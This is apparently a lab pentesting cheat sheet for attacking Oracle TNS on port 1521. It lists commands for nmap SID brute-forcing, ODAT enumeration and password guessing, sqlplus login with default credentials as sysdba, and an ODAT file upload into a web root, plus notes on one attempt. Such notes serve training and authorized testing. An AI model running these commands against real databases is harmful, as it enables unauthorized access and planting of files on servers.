Oracle TNS (Transparent Network Substrate) is used to **connect** a client (like a programmer's computer) to an Oracle database **over a network**.


| PORT | 1521 |
| ---- | ---- |
```sh
sudo nmap -p1521 -sV 10.129.204.235 --open
```

## Nmap - SID Bruteforcing

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

## ODAT

Info gathering tool.
```sh
./odat.py all -s 10.129.204.235
```

## SQLplus - Log In

```sh
sqlplus scott/tiger@10.129.204.235/XE
```
If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```sh
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
## Oracle RDBMS - Database Enumeration

```sh
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```


# Default Paths 
| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |


## Oracle RDBMS - File Upload

```sh
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

# Optional 
APPROACH
1. I have successfully enumerated the SID `XE` of the database using NMAP -  
    `sudo nmap -p1521 -sV 10.129.x.x --open --script oracle-sid-brute`
    
2. After that I tried enumerating with `odatpy` to get some more information, looking for credentials -  
    `./odat.py passwordguesser -p 1521 -d XE -s 10.129.x.x`  
    `./odat.py all -s 10.129.x.x -p 1521 -d XE`  
    Both of these come back with no further information.
    
3. From there I tried signing in using some default usernames and passwords with `sqlplus`  
    `sqlplus scott/tiger@10.129.x.x/XE;`  
    `sqlplus DBSNMP/DBSNMP@10.129.x.x/XE;`  
    Any combination I have tried here has not been able to authenticate.
